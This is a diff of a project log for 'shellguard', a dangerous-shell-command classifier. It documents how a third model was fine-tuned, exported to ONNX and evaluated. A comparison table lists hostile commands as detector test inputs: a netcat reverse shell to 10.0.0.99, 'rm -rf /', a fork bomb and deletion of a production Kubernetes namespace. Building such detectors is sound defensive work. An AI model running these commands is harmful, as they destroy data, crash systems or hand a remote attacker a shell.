@@ -390,12 +390,99 @@ Tests (written first, `tests/test_model_b.py`, 6): ONNX session is CPU-only;
 embeddings are 384-wide unit vectors; learns the toy set; output shape; save→load
 identical; test recall beats the regex baseline.
 
-### Step 7 — Model C: fine-tuned base model ⏳
+### Step 7 — Model C: fine-tuned base model ✅
 
-Same bge-small, but this time we **adjust all its weights** on our data
-(training may use the M1 GPU/MPS). Then export to ONNX so it still runs
-CPU-only. Optional: if it doesn't beat A/B, it's for learning, not shipping.
-Risk: 8 GB RAM — small batches, short sequences.
+```bash
+make train MODEL=model_c   # 9.5 min on M1 GPU (MPS) → models/model_c/{model.onnx, tokenizer.json}
+make eval  MODEL=model_c   # CPU only → results/model_c.json
+```
+
+Code: `src/shellguard/model_c.py`. Training tools (`torch`, `transformers`,
+`onnx`, `onnxscript`) are **dev dependencies only** — running the model never
+needs them.
+
+```
+ TRAIN (PyTorch, M1 GPU via MPS)                         RUN (CPU only, no PyTorch)
+ bge-small (33M weights) + new 2-way output layer        models/model_c/model.onnx (135 MB)
+        │ fine-tune: ALL weights change                   models/model_c/tokenizer.json
+        ▼                                                         │
+ torch.onnx.export(dynamo=True) ─────────────────────────────────▶ onnxruntime CPUExecutionProvider
+                                                                  + tokenizers → P(dangerous)
+```
+
+**Difference from B:** B froze bge-small and trained 385 numbers on top.
+C changes *all 33 million* weights, so the model itself learns that `/` vs
+`./build` matters.
+
+**The training loop**, every piece (`finetune()`):
+
+| Piece | Setting | What it means |
+|---|---|---|
+| model | `AutoModelForSequenceClassification("BAAI/bge-small-en-v1.5", num_labels=2)` | bge-small + a fresh 2-output layer (safe, dangerous) |
+| tokenizer | bge-small's WordPiece, pad/truncate to 64 tokens | `git clean -fdx` → `gi ##t clean - f ##d ##x`. p99 of commands is 40 tokens |
+| batch | 32 commands | weights update after every 32 commands |
+| epoch | 2 | one epoch = one pass over all 22,624 commands → 1,414 updates total |
+| loss | cross-entropy (built into the model) | how wrong the prediction was; training pushes it down |
+| optimizer | AdamW, lr 5e-5, weight decay 0.01 | the rule that nudges weights to reduce loss; lr = step size |
+| schedule | linear warmup 10% then decay to 0 | start gentle (don't wreck pretrained knowledge), end gentle |
+| seed | 42 | same shuffling every run |
+
+Loss went 0.69 (coin flip) → 0.10 (end epoch 1) → ~0.02 (end epoch 2).
+
+**Problem hit — 8 GB RAM:** first run with variable-length batches swapped
+for 13 min at 22% CPU, 4.3 GB. A 40-step benchmark showed each config is fine
+short-term, so memory was growing over time. Fix: pad every batch to the same
+64 tokens → one tensor shape → MPS memory stayed flat at **2.30 GB** the whole
+run (logged every 100 steps). Costs ~35% more time per step.
+Also measured: on this M1, CPU training is only ~15% slower than MPS for a model this small.
+
+**Export:** `torch.onnx.export(..., dynamo=True)` with dynamic batch/sequence
+size. `tokenizer.json` saved next to it. Inference = `tokenizers` +
+`onnxruntime` (CPU provider forced) + softmax.
+
+**Result:**
+
+| | test recall | test precision | test F1 | golden F1 | golden wrong | speed (CPU) | size | train |
+|---|---|---|---|---|---|---|---|---|
+| regex | 0.236 | 0.920 | 0.375 | 0.864 | 6 | 4 µs | — | — |
+| A no base | **0.986** | 0.973 | 0.980 | 0.863 | 7 | **250 µs** | **1.1 MB** | **2.4 s** |
+| B frozen base | 0.916 | 0.872 | 0.893 | 0.792 | 11 | 5,575 µs | 64 MB | 265 s |
+| **C fine-tuned** | 0.985 | **0.987** | **0.986** | **0.939** | **3** | 14,184 µs | 135 MB | 572 s |
+
+P(dangerous) side by side:
+
+```
+   A     B     C    command
+ 1.00  0.94  1.00   rm -rf /
+ 0.29  0.65  0.12   rm -rf ./build               ← C separates the pair cleanly
+ 0.58  0.82  0.99   git clean -fdx
+ 0.27  0.25  0.01   git clean -n                 ← dry run
+ 0.64  0.36  0.00   nc -e /bin/sh 10.0.0.99 9001 ← C confidently WRONG (reverse shell)
+ 0.94  0.95  0.99   cat /etc/hosts               ← all three fall for the /etc/ shortcut
+ 0.69  0.72  0.01   tar -czf backup.tgz src/
+ 0.40  0.46  0.99   :(){ :|:& };:                ← fork bomb
+ 0.44  0.52  0.87   kubectl delete namespace production
+```
+
+What this teaches:
+- **Fine-tuning fixed what freezing broke.** Same base model as B, but now
+  it separates `/` from `./build` and `-fdx` from `-n`. Best golden score of all.
+- **Best ≠ obviously better.** C fixes 4 more golden commands than A, but is
+  57× slower and 120× bigger. With only 48 golden commands, 1 command = 2
+  points — the gap is real but small-sample.
+- **Confidently wrong on unseen patterns.** `nc -e` appears **0 times** in
+  training. A said 0.64 (unsure, right side), C says 0.00 (sure, wrong side).
+  Fine-tuned models are often over-confident. Data gaps need data, not a
+  bigger model.
+- **14 ms is slow for this size.** fastembed ran the same-size bge-small in
+  ~5 ms; our export is plain fp32 and unoptimised. Step 8 can try int8
+  quantisation (smaller + faster).
+
+Tests (written first, `tests/test_model_c.py`, 7): export writes both files;
+learns the toy set; **ONNX output equals PyTorch output** (±1e-4, proves the
+export is faithful); ONNX session is CPU-only; output shape; inference in a
+fresh process **never imports torch or transformers**; test recall beats regex.
+Found by the tests: `load()` crashed on a string path — fixed.
 
 ### Step 8 — Evaluate and pick ⏳
 
